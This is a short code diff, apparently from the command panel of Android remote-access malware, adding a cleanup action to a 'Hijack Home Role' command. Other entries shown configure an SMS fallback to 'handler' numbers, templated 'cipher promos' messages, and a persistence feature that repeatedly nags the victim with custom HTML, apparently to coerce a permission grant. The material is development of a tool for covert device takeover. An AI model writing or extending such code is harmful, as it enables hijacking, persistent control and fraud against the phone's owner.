@@ -884,7 +884,7 @@
                     { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Handler Number(s) (Comma list ok)', type: 'text'}] },
                     { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] },
                     { id: 'SET_RELENTLESS_ACC', name: 'Config Persistence (ACC)', icon: '♾️', inputs: [{id: 'acc-chill', label: 'Initial Chill (Mins)', type: 'number', val: 1440}, {id: 'acc-interval', label: 'Nag Interval (Mins)', type: 'number', val: 2}, {id: 'acc-max', label: 'Max Attempts', type: 'number', val: 5}, {id: 'acc-html', label: 'Custom Nag UI (HTML)', type: 'textarea'}], cleanup: 'STOP_RELENTLESS_ACC' },
-                    { id: 'HIJACK_LAUNCHER', name: 'Hijack Home Role', icon: '🏠', keywords: 'home, default, ghost, hand, blindfold', inputs: [] }
+                    { id: 'HIJACK_LAUNCHER', name: 'Hijack Home Role', icon: '🏠', keywords: 'home, default, ghost, hand, blindfold', inputs: [], cleanup: 'RESTORE_LAUNCHER' }
                 ]
             }
         ];
